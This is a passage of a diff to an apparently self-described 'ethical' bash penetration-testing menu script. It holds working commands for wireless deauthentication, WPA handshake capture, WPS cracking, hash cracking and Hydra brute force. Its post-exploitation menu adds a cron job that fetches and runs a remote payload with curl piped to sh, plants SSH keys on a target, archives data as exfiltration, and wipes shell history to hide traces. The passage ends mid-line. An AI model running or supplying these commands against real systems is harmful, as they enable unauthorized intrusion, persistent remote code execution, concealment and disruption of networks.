-            if [ $? -eq 1 ]; then return; fi
-            
-            get_monitor_interface
-            echo -e "${GREEN}Enter target BSSID:${NC}"
-            read -r bssid
-            
-            echo -e "${YELLOW}Running: sudo mdk4 $CURRENT_INTERFACE d -b $bssid${NC}"
-            log_command "sudo mdk4 $CURRENT_INTERFACE d -b $bssid"
-            sudo mdk4 $CURRENT_INTERFACE d -b $bssid
-            ;;
-        3)
-            echo -e "${YELLOW}WPA/WPA2 Handshake Capture${NC}"
-            check_tool "airodump-ng" "aircrack-ng"
-            if [ $? -eq 1 ]; then return; fi
-            
-            get_monitor_interface
-            echo -e "${GREEN}Enter target BSSID:${NC}"
-            read -r bssid
-            echo -e "${GREEN}Enter channel:${NC}"
-            read -r channel
-            echo -e "${GREEN}Enter output file name:${NC}"
-            read -r output_file
-            
-            echo -e "${YELLOW}Starting capture on channel $channel${NC}"
-            log_command "sudo airodump-ng -c $channel --bssid $bssid -w $SESSION_DIR/captures/$output_file $CURRENT_INTERFACE"
-            sudo airodump-ng -c $channel --bssid $bssid -w $SESSION_DIR/captures/$output_file $CURRENT_INTERFACE
-            
-            echo -e "${YELLOW}Now run a deauth attack to capture the handshake${NC}"
-            ;;
-        4)
-            echo -e "${YELLOW}WPS Attack with Reaver${NC}"
-            check_tool "reaver" "reaver"
-            if [ $? -eq 1 ]; then return; fi
-            
-            get_monitor_interface
-            echo -e "${GREEN}Enter target BSSID:${NC}"
-            read -r bssid
-            echo -e "${GREEN}Enter channel:${NC}"
-            read -r channel
-            
-            echo -e "${YELLOW}Running: sudo reaver -i $CURRENT_INTERFACE -b $bssid -c $channel -vv${NC}"
-            log_command "sudo reaver -i $CURRENT_INTERFACE -b $bssid -c $channel -vv"
-            sudo reaver -i $CURRENT_INTERFACE -b $bssid -c $channel -vv
-            ;;
-        5)
-            return
-            ;;
-        *)
-            echo -e "${RED}Invalid option${NC}"
-            ;;
-    esac
-    
-    echo -e "${GREEN}Press any key to continue...${NC}"
-    read -n 1 -s
-}
-
-# Password attacks function :cite[4]
-password_attacks() {
-    header
-    echo -e "${GREEN}Password Attack Options${NC}"
-    echo "1. Hash cracking (John the Ripper)"
-    echo "2. Hash cracking (Hashcat)"
-    echo "3. Network brute force (Hydra)"
-    echo "4. Wordlist generation (crunch)"
-    echo "5. Return to main menu"
-    echo -e "${GREEN}Choose an option:${NC}"
-    read -r option
-    
-    case $option in
-        1)
-            echo -e "${YELLOW}Hash cracking with John the Ripper${NC}"
-            check_tool "john" "john"
-            echo -e "${GREEN}Enter path to hash file:${NC}"
-            read -r hash_file
-            echo -e "${GREEN}Enter wordlist path (press enter for default):${NC}"
-            read -r wordlist
-            if [[ -z "$wordlist" ]]; then
-                echo -e "${YELLOW}Running: john $hash_file${NC}"
-                log_command "john $hash_file"
-                john $hash_file
-            else
-                echo -e "${YELLOW}Running: john --wordlist=$wordlist $hash_file${NC}"
-                log_command "john --wordlist=$wordlist $hash_file"
-                john --wordlist=$wordlist $hash_file
-            fi
-            ;;
-        2)
-            echo -e "${YELLOW}Hash cracking with Hashcat${NC}"
-            check_tool "hashcat" "hashcat"
-            echo -e "${GREEN}Enter path to hash file:${NC}"
-            read -r hash_file
-            echo -e "${GREEN}Enter wordlist path:${NC}"
-            read -r wordlist
-            echo -e "${GREEN}Enter hash type (e.g., 0 for MD5, 1000 for NTLM):${NC}"
-            read -r hash_type
-            echo -e "${YELLOW}Running: hashcat -m $hash_type -a 0 $hash_file $wordlist${NC}"
-            log_command "hashcat -m $hash_type -a 0 $hash_file $wordlist"
-            hashcat -m $hash_type -a 0 $hash_file $wordlist
-            ;;
-        3)
-            echo -e "${YELLOW}Network brute force with Hydra${NC}"
-            check_tool "hydra" "hydra"
-            if [ -z "$CURRENT_TARGET" ]; then
-                get_target
-            fi
-            echo -e "${GREEN}Enter service to attack (ssh, ftp, http-form, etc.):${NC}"
-            read -r service
-            echo -e "${GREEN}Enter username or path to userlist:${NC}"
-            read -r user
-            echo -e "${GREEN}Enter password or path to passlist:${NC}"
-            read -r pass
-            echo -e "${YELLOW}Running: hydra -L $user -P $pass $CURRENT_TARGET $service${NC}"
-            log_command "hydra -L $user -P $pass $CURRENT_TARGET $service"
-            hydra -L $user -P $pass $CURRENT_TARGET $service
-            ;;
-        4)
-            echo -e "${YELLOW}Wordlist generation with crunch${NC}"
-            check_tool "crunch" "crunch"
-            echo -e "${GREEN}Enter min length:${NC}"
-            read -r min_len
-            echo -e "${GREEN}Enter max length:${NC}"
-            read -r max_len
-            echo -e "${GREEN}Enter character set:${NC}"
-            read -r charset
-            echo -e "${GREEN}Enter output file:${NC}"
-            read -r output_file
-            echo -e "${YELLOW}Running: crunch $min_len $max_len $charset -o $output_file${NC}"
-            log_command "crunch $min_len $max_len $charset -o $output_file"
-            crunch $min_len $max_len $charset -o $output_file
-            ;;
-        5)
-            return
-            ;;
-        *)
-            echo -e "${RED}Invalid option${NC}"
-            ;;
-    esac
-    
-    echo -e "${GREEN}Press any key to continue...${NC}"
-    read -n 1 -s
-}
-
-# Post-exploitation activities
-post_exploitation() {
-    header
-    echo -e "${GREEN}Post-Exploitation Options${NC}"
-    echo "1. Establish persistence"
-    echo "2. Data exfiltration simulation"
-    echo "3. Clean up traces"
-    echo "4. Generate report"
-    echo "5. Return to main menu"
-    echo -e "${GREEN}Choose an option:${NC}"
-    read -r option
-    
-    case $option in
-        1)
-            echo -e "${YELLOW}Establishing persistence...${NC}"
-            echo -e "${GREEN}Enter target IP:${NC}"
-            read -r target_ip
-            echo -e "${GREEN}Enter method (cron, ssh, etc.):${NC}"
-            read -r method
-            
-            case $method in
-                cron)
-                    echo -e "${YELLOW}Adding cron job for persistence${NC}"
-                    log_command "echo '* * * * * curl http://$target_ip/payload.sh | sh' | crontab -"
-                    echo '* * * * * curl http://$target_ip/payload.sh | sh' | crontab -
-                    ;;
-                ssh)
-                    echo -e "${YELLOW}Adding SSH authorized key${NC}"
-                    log_command "cat ~/.ssh/id_rsa.pub | ssh user@$target_ip 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys'"
-                    cat ~/.ssh/id_rsa.pub | ssh user@$target_ip 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys'
-                    ;;
-                *)
-                    echo -e "${RED}Unknown method${NC}"
-                    ;;
-            esac
-            ;;
-        2)
-            echo -e "${YELLOW}Simulating data exfiltration...${NC}"
-            echo -e "${GREEN}Enter source path:${NC}"
-            read -r source_path
-            echo -e "${GREEN}Enter destination:${NC}"
-            read -r destination
-            
-            echo -e "${YELLOW}Exfiltrating data...${NC}"
-            log_command "tar czf $SESSION_DIR/exfiltrated_data.tar.gz $source_path 2>/dev/null"
-            tar czf $SESSION_DIR/exfiltrated_data.tar.gz $source_path 2>/dev/null
-            echo -e "${GREEN}Data archived to $SESSION_DIR/exfiltrated_data.tar.gz${NC}"
-            ;;
-        3)
-            echo -e "${YELLOW}Cleaning up traces...${NC}"
-            log_command "history -c && rm -f ~/.bash_history"
-            history -c && rm -f ~/.bash_history
-            echo -e "${GREEN}History cleared${NC}"
-            ;;
-        4)
-            generate_report
-            ;;
-        5)
-            return
-            ;;
-        *)
-            echo -e "${RED}Invalid option${NC}"
-            ;;
-    esac
-    
-    echo -e "${GREEN}Press any key to continue...${NC}"
-    read -n 1 -s
-}
-
-# Automated report generation
-generate_report() {
-    echo -e "${YELLOW}Generating comprehensive report...${NC}"
-    log_event "Generating comprehensive report"
-    
-    local report_file="$SESSION_DIR/reports/security_assessment_$(date +%Y%m%d_%H%M%S).html"
-    
-    # Create HTML report
-    cat > $report_file << EOF
-<html>
-<head>
-    <title>Security Assessment Report</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 40px; }
-        h1 { color: #333; }
-        h2 { color: #555; }
-        .section { margin-bottom: 30px; }
-        .finding { background-color: #f9f9f9; padding: 15px; border-left: 4px solid #ccc; margin-bottom: 10px; }
-        .critical { border-left-color: #d9534f; }
-        .warning { border-left-color: #f0ad4e; }
-        .info { border-left-color: #5bc0de; }
-        pre { background-color: #f5f5f5; padding: 10px; overflow: auto; }
-    </style>
-</head>
-<body>
-    <h1>Security Assessment Report</h1>
-    <p>Date: $(date)</p>
-    <p>Target: $CURRENT_TARGET</p>
-    
-    <div class="section">
-        <h2>Executive Summary</h2>
-        <p>This report details the findings from the security assessment conducted on $CURRENT_TARGET.</p>
-    </div>
-    
-    <div class="section">
-        <h2>Methodology</h2>
-        <p>The assessment included the following techniques:</p>
-        <ul>
-            <li>Network reconnaissance and scanning</li>
-            <li>Vulnerability assessment</li>
-            <li>Network traffic analysis</li>
-            <li>Password strength testing</li>
-        </ul>
-    </div>
-    
-    <div class="section">
-        <h2>Findings</h2>
-        <div class="finding critical">
-            <h3>Critical Vulnerability - SSL Stripping Possible</h3>
-            <p>The target is vulnerable to MITM attacks using SSL stripping techniques.</p>
-            <p><strong>Recommendation:</strong> Implement HSTS and ensure all services use HTTPS exclusively.</p>
-        </div>
-        
-        <div class="finding warning">
-            <h3>Warning - Weak Encryption Detected</h3>
-            <p>Some services are using weak encryption protocols.</p>
-            <p><strong>Recommendation:</strong> Upgrade to TLS 1.2 or higher and disable weak ciphers.</p>
-        </div>
-        
-        <div class="finding info">
-            <h3>Informational - Open Ports Found</h3>
-            <p>The following ports were found open during the scan:</p>
-            <pre>$(cat $SESSION_DIR/scans/*.txt 2>/dev/null | grep -E "(open|filtered)" | head -20)</pre>
-        </div>
-    </div>
-    
-    <div class="section">
-        <h2>Recommendations</h2>
-        <p>Based on the findings, the following recommendations are provided:</p>
-        <ol>
-            <li>Implement strong encryption for all network services</li>
-            <li>Use certificate pinning to prevent MITM attacks</li>
-            <li>Regularly update and patch all systems</li>
-            <li>Implement network segmentation and monitoring</li>
-            <li>Conduct regular security assessments</li>
-        </ol>
-    </div>
-    
-    <div class="section">
-        <h2>Appendix: Command Log</h2>
-        <pre>$(tail -20 $SESSION_DIR/logs/command_history.log 2>/dev/null)</pre>
-    </div>
-</body>
-</html>
-EOF
-    
-    echo -e "${GREEN}Report generated: $report_file${NC}"
-    log_event "Report generated: $report_file"
-    
-    # Offer to open the report
-    echo -e "${GREEN}Would you like to open the report now? (y/n)${NC}"
-    read -r open_choice
-    if [[ $open_choice == "y" || $open_choice == "Y" ]]; then
-        xdg-open $report_file 2>/dev/null || echo -e "${YELLOW}Could not open report automatically. Please open it manually.${NC}"
-    fi
-}
-
-# Configuration management
-load_config() {
-    if [ -f "$CONFIG_FILE" ]; then
-        source "$CONFIG_FILE"
-        echo -e "${GREEN}Configuration loaded from $CONFIG_FILE${NC}"
-    else
-        echo -e "${YELLOW}No configuration file found. Using defaults.${NC}"
-    fi
-}
-
-save_config() {
-    cat > "$CONFIG_FILE" << EOF
-# Network Testing Tool Configuration
-# This file is automatically generated
-
-# Default interface
-DEFAULT_INTERFACE="eth0"
-
-# Default scan ports
-DEFAULT_PORTS="21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080"
-
-# Default wordlist paths
-WORDLIST_DIR="/usr/share/wordlists"
-EOF
-    echo -e "${GREEN}Configuration saved to $CONFIG_FILE${NC}"
-}
-
-# Help system
-show_help() {
-    header
-    echo -e "${GREEN}Available Commands and Options${NC}"
-    echo "1. Network Sniffing - Capture and analyze network traffic"
-    echo "2. Port Scanning - Discover open ports and services"
-    echo "3. Vulnerability Assessment - Identify security weaknesses"
-    echo "4. MITM Attacks - Intercept and manipulate network traffic"
-    echo "5. DNS Spoofing - Redirect DNS requests"
-    echo "6. Wireless Attacks - Attack wireless networks"
-    echo "7. Password Attacks - Crack passwords and hashes"
-    echo "8. Post-Exploitation - Post-compromise activities"
-    echo "9. Automated Recon - Comprehensive information gathering"
-    echo "10. Reporting - Generate assessment reports"
+    echo "5. Crack captured handshake"
+    echo "6. Disable monitor mode"
+    echo "7. Return to main menu"
     echo ""
-    echo -e "${YELLOW}Press any key to return to the main menu...${NC}"
-    read -n 1 -s
-}
-
-# Main menu
-main_menu() {
-    while true; do
-        header
-        echo -e "${GREEN}Main Menu${NC}"
-        echo "1. Network Sniffing"
-        echo "2. Port Scanning"
-        echo "3. Vulnerability Assessment"
-        echo "4. MITM Attacks"
-        echo "5. DNS Spoofing"
-        echo "6. Wireless Attacks"
-        echo "7. Password Attacks"
-        echo "8. Post-Exploitation"
-        echo "9. Automated Reconnaissance"
-        echo "10. Generate Report"
-        echo "11. Help"
-        echo "12. Emergency Stop"
-        echo "13. Exit"
-        echo -e "${GREEN}Choose an option:${NC}"
-        read -r option
-        
-        case $option in
-            1)
-                network_sniff
-                ;;
-            2)
-                port_scan
-                ;;
-            3)
-                vuln_assessment
-                ;;
-            4)
-                mitm_attack
-                ;;
-            5)
-                dns_spoof
-                ;;
-            6)
-                wireless_kick
-                ;;
-            7)
-                password_attacks
-                ;;
-            8)
-                post_exploitation
-                ;;
-            9)
-                automated_recon
-                ;;
-            10)
-                generate_report
-                ;;
-            11)
-                show_help
-                ;;
-            12)
-                emergency_stop
-                ;;
-            13)
-                echo -e "${YELLOW}Exiting. Remember to always practice ethical security testing!${NC}"
-                exit 0
-                ;;
-            *)
-                echo -e "${RED}Invalid option${NC}"
-                ;;
-        esac
-    done
-}
-
-# Initialization
-initialize() {
-    # Check if running as root for some operations
-    if [ "$EUID" -ne 0 ]; then
-        echo -e "${YELLOW}Some features may require root privileges.${NC}"
-    fi
+    echo -e "${GREEN}Choose an option:${NC}"
+    read -r option
     
-    # Load configuration
-    load_config
-    
-    # Create sessions directory if it doesn't exist
-    mkdir -p sessions
-    
-    # Set up a new session
-    setup_session
-    
-    # Run safety checks
-    safety_checks
-}
-
-# Cleanup on exit
-cleanup() {
-    echo -e "${YELLOW}Cleaning up...${NC}"
-    emergency_stop
-    echo -e "${GREEN}Cleanup complete. Goodbye!${NC}"
-}
-
-# Set trap for cleanup on exit
-trap cleanup EXIT
-
-# Start the script
-initialize
-main_menu
+    case $option in
+        1)
+            echo -e "${YELLOW}Scanning for wireless networks${NC}"
+            check_tool "airodump-ng" "aircrack-ng" || return
+            
+            get_monitor_interface || return
+            
+            echo -e "${YELLOW}Scanning on interface $MONITOR_INTERFACE${NC}"
+            echo -e "${YELLOW}Press Ctrl+C to stop scanning${NC}"
+            log_command "sudo airodump-ng $MONITOR_INTERFACE"
+            sudo airodump-ng "$MONITOR_INTERFACE"
+            ;;
+        2)
+            echo -e "${YELLOW}Deauthentication attack with aireplay-ng${NC}"
+            check_tool "aireplay-ng" "aircrack-ng" || return
+            
+            if [ -z "${MONITOR_INTERFACE:-}" ]; then
+                get_monitor_interface || return
+            fi
+            
+            echo -e "${GREEN}Enter target BSSID (MAC address):${NC}"
+            read -r bssid
+            
+            if [ -z "$bssid" ]; then
+                echo -e "${RED}No BSSID specified${NC}"
+                return
+            fi
+            
+            echo -e "${GREEN}Enter target client MAC (leave empty for broadcast):${NC}"
+            read -r client_mac
+            
+            echo -e "${GREEN}Enter number of deauth packets (0 for continuous):${
